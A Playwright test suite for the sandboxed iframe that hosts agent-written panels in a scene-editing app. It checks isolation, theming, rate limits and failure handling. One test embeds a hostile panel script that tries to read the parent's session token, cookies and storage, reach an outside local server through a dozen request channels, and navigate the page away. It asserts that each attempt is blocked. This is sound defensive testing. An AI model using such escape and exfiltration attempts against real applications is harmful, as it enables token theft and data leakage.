import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { expect, type Page, test } from "@playwright/test";
import {
  askForPanel,
  current,
  frame,
  offerCard,
  openClearancePanel,
  openCustomPanel,
  sceneOf,
  shell,
  start,
  stopBridge,
} from "./panel-support.ts";

// The sandbox: a generated panel is code an agent wrote, so it runs where it can reach nothing but the scene
// operations the page lets through its one port.

test.afterEach(stopBridge);

/** The colour the panel's own page is painted. */
const background = (page: Page) =>
  frame(page)
    .locator("body")
    .evaluate((el) => getComputedStyle(el).backgroundColor);

test.describe("the frame", () => {
  test("it is sandboxed to scripts only, with a policy, and has an opaque origin", async ({ page }) => {
    await start(page);
    await openClearancePanel(page);
    const iframe = page.getByTestId("panel-frame");
    await expect(iframe).toHaveAttribute("sandbox", "allow-scripts");
    await expect(iframe).toHaveAttribute("csp", /default-src 'none'.*connect-src 'none'.*frame-src 'none'/);
    // No allow-same-origin: the document's own origin is opaque, so it has no storage and no cookies.
    const seen = await frame(page)
      .locator("body")
      .evaluate(() => {
        let storage = "available";
        try {
          storage = String(window.localStorage.length);
        } catch (error) {
          storage = `blocked:${(error as Error).name}`;
        }
        return { origin: location.origin, storage };
      });
    expect(seen).toEqual({ origin: "null", storage: "blocked:SecurityError" });
  });

  test("Theme follows the app: the panel's colours change with the light and dark themes, without reloading", async ({
    page,
  }) => {
    await page.emulateMedia({ colorScheme: "light" });
    await start(page);
    await openClearancePanel(page);
    await frame(page)
      .locator("body")
      .evaluate(() => {
        (window as unknown as { marker: string }).marker = "kept";
      });
    const light = await background(page);
    expect(light).toBe("rgb(255, 255, 255)");
    await page.emulateMedia({ colorScheme: "dark" });
    await expect.poll(() => background(page)).toBe("rgb(28, 28, 30)");
    // The same document: nothing was reloaded.
    expect(
      await frame(page)
        .locator("body")
        .evaluate(() => (window as unknown as { marker: string }).marker),
    ).toBe("kept");
    await page.emulateMedia({ colorScheme: "light" });
    await expect.poll(() => background(page)).toBe(light);
  });

  test("a panel gets the base styles: unstyled controls are sized for a fingertip", async ({ page }) => {
    await start(page);
    await openClearancePanel(page);
    const sizes = await frame(page)
      .locator("body")
      .evaluate(() => {
        const rect = (selector: string) => document.querySelector(selector)?.getBoundingClientRect();
        return { button: rect("#apply")?.height ?? 0, range: rect("#s")?.height ?? 0 };
      });
    expect(sizes.button).toBeGreaterThanOrEqual(40);
    expect(sizes.range).toBeGreaterThanOrEqual(32);
  });
});

test.describe("what a panel may send", () => {
  test("Invalid operation: a wall of height zero changes nothing, and the panel is told which wall and field", async ({
    page,
  }) => {
    await start(page);
    const before = await sceneOf(page);
    await openCustomPanel(
      page,
      `<p id="told">waiting</p><script>
        hai.on("problem", (message) => { document.getElementById("told").textContent = message; });
        hai.preview([{ op: "update", id: "wall-n", patch: { height: 0 } }]);
      </script>`,
    );
    await expect(frame(page).locator("#told")).toHaveText('Element "wall-n": height must be greater than 0');
    expect(await sceneOf(page)).toEqual(before);
    expect(current().scene.scene.doc.elements["wall-n"]).toEqual(before["wall-n"]);
  });

  test("Flooding is limited: 200 messages in a second are cut to 60 and the panel is told", async ({
    page,
  }) => {
    await start(page);
    await openCustomPanel(
      page,
      `<p id="told">waiting</p><script>
        hai.on("problem", (message) => { document.getElementById("told").textContent = message; });
        for (let i = 0; i < 200; i++) hai.preview([]);
      </script>`,
    );
    await expect(frame(page).locator("#told")).toContainText("at most 60 per second");
  });

  test("A broken panel does not break the app: a script error after load shows in the header, the app goes on", async ({
    page,
  }) => {
    await start(page);
    await openCustomPanel(
      page,
      "<p>ok</p><script>setTimeout(() => { throw new Error('late failure'); }, 150)</script>",
    );
    await expect(shell(page).getByTestId("panel-failed")).toBeVisible();
    await expect(shell(page).getByTestId("panel-reason")).toContainText("late failure");
    // The viewer and the agent panel keep working.
    await expect(page.getByTestId("agent-input")).toBeEnabled();
    await page.keyboard.press("w");
    await expect(page.getByTestId("active-tool")).toHaveAttribute("data-tool", "wall");
    await shell(page).getByTestId("panel-close").click();
    await expect(shell(page)).toHaveCount(0);
  });

  test("a document that loops forever is called failed, and Close still works", async ({ page }) => {
    test.setTimeout(90_000);
    await start(page);
    await askForPanel("<script>while (true) {}</script>");
    await expect(offerCard(page)).toBeVisible();
    await page.getByTestId("offer-open").click();
    // The page stays alive while the frame spins, and calls the document failed once its load time is up.
    await expect(shell(page)).toHaveAttribute("data-status", "failed", { timeout: 20_000 });
    await expect(shell(page).getByTestId("panel-reason")).toContainText("did not finish loading");
    await shell(page).getByTestId("panel-close").click();
    await expect(shell(page)).toHaveCount(0);
  });
});

test.describe("a hostile panel", () => {
  test("every attempt to get out fails, no request is answered, and the app keeps working", async ({
    page,
  }) => {
    test.setTimeout(90_000);
    // A server on another port that must never be reached.
    const probed: string[] = [];
    const probe = createServer((req, res) => {
      probed.push(req.url ?? "");
      res.writeHead(200, { "access-control-allow-origin": "*" }).end("reached");
    });
    await new Promise<void>((resolve) => probe.listen(0, "127.0.0.1", resolve));
    const probePort = (probe.address() as AddressInfo).port;
    try {
      await start(page);
      // Negative control: the app page itself can reach that server, so an empty log below means something.
      const control = await page.evaluate(
        (u) => fetch(u).then((r) => r.text()),
        `http://127.0.0.1:${probePort}/control`,
      );
      expect(control).toBe("reached");
      expect(probed).toEqual(["/control"]);
      probed.length = 0;
      // Whatever the panel asked for, nothing may have answered: a blocked request is never sent.
      const answered: string[] = [];
      page.on("response", (response) => answered.push(response.url()));
      const bridgePort = current().port;
      const before = await sceneOf(page);
      const url = page.url();
      const doc = `<pre id="out">starting</pre><script>
        const OUT = {};
        const PROBE = "http://127.0.0.1:${probePort}";
        const BRIDGE = "http://127.0.0.1:${bridgePort}";
        const show = () => { document.getElementById("out").textContent = JSON.stringify(OUT); };
        const attempt = (name, fn) => {
          try { Promise.resolve(fn()).then((v) => { OUT[name] = "result:" + v; show(); }, (e) => { OUT[name] = "blocked:" + (e && e.name); show(); }); }
          catch (e) { OUT[name] = "blocked:" + (e && e.name); show(); }
        };
        attempt("token", () => String(window.parent.__HAI_SESSION__));
        attempt("parentDocument", () => String(window.parent.document.body));
        attempt("storage", () => String(window.localStorage.length));
        attempt("cookie", () => String(document.cookie));
        attempt("fetchOutside", () => fetch(PROBE + "/fetch").then((r) => r.text()));
        attempt("fetchBridge", () => fetch(BRIDGE + "/health").then((r) => r.text()));
        attempt("xhr", () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", PROBE + "/xhr"); x.onload = () => resolve(x.responseText); x.onerror = () => reject({ name: "NetworkError" }); x.send(); }));
        attempt("websocket", () => new Promise((resolve, reject) => { const w = new WebSocket("ws://127.0.0.1:${bridgePort}/ws", ["hai.v1"]); w.onopen = () => resolve("open"); w.onerror = () => reject({ name: "WebSocketError" }); }));
        attempt("beacon", () => String(navigator.sendBeacon(PROBE + "/beacon", "x")));
        attempt("eventsource", () => new Promise((resolve, reject) => { const s = new EventSource(PROBE + "/events"); s.onopen = () => resolve("open"); s.onerror = () => reject({ name: "EventSourceError" }); }));
        attempt("image", () => new Promise((resolve, reject) => { const i = new Image(); i.onload = () => resolve("loaded"); i.onerror = () => reject({ name: "ImageError" }); i.src = PROBE + "/image.png"; }));
        attempt("importScript", () => import(PROBE + "/module.js").then(() => "imported"));
        attempt("topNavigation", () => { window.top.location.href = PROBE + "/top"; return "no error"; });
        attempt("windowOpen", () => String(window.open(PROBE + "/open")));
        attempt("form", () => { const f = document.createElement("form"); f.method = "post"; f.action = PROBE + "/form"; document.body.append(f); f.submit(); return "submitted"; });
        attempt("nestedFrame", () => new Promise((resolve) => { const f = document.createElement("iframe"); f.src = PROBE + "/nested"; document.body.append(f); setTimeout(() => resolve("appended"), 300); }));
        attempt("malformedOperations", () => { hai.preview([{ op: "format-disk" }]); hai.preview("everything"); hai.preview([{ op: "delete", id: "no-such-element" }]); hai.preview([{ op: "update", id: "wall-n", patch: { height: -5 } }]); return "sent"; });
        attempt("rawParentMessage", () => { window.parent.postMessage({ type: "scene.apply", payload: { label: "x", ops: [{ op: "delete", id: "wall-n" }] } }, "*"); return "posted"; });
        setTimeout(() => { OUT.finished = true; show(); }, 1200);
        setTimeout(() => attempt("metaRefresh", () => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + PROBE + "/refresh"; document.head.append(m); return "added"; }), 2500);
        setTimeout(() => attempt("selfNavigation", () => { location.href = PROBE + "/self"; return "no error"; }), 3500);
      </script>`;
      await openCustomPanel(page, doc);
      // Wait for every attempt to have been made, then read what each one came to.
      await expect(frame(page).locator("#out")).toContainText('"finished":true');
      const out = JSON.parse((await frame(page).locator("#out").textContent()) ?? "{}");
      for (const name of ["token", "parentDocument", "storage", "cookie"])
        expect(out[name], name).toMatch(/^blocked:SecurityError/);
      for (const name of [
        "fetchOutside",
        "fetchBridge",
        "xhr",
        "websocket",
        "eventsource",
        "image",
        "importScript",
      ])
        expect(out[name], name).toMatch(/^blocked:/);
      expect(out.windowOpen).toBe("result:null");
      // Then the document sends itself somewhere else: the page ends it.
      await expect(shell(page)).toHaveAttribute("data-status", "failed", { timeout: 15_000 });
      await expect(shell(page).getByTestId("panel-reason")).toContainText("navigate away");
      await page.waitForTimeout(1000);

      // Nothing reached the other server, and no request for it left the page.
      expect(probed).toEqual([]);
      expect(answered.filter((u) => u.includes(`:${probePort}`))).toEqual([]);
      // The app is where it was, and still works.
      expect(page.url()).toBe(url);
      expect(await sceneOf(page)).toEqual(before);
      await expect(page.getByTestId("agent-input")).toBeEnabled();
      expect(await page.evaluate(() => window.__HAI_SCENE__?.getSnapshot().canUndo)).toBe(false);
      await shell(page).getByTestId("panel-close").click();
      await expect(shell(page)).toHaveCount(0);
      expect(await sceneOf(page)).toEqual(before);
    } finally {
      probe.closeAllConnections();
      await new Promise((resolve) => probe.close(resolve));
    }
  });
});
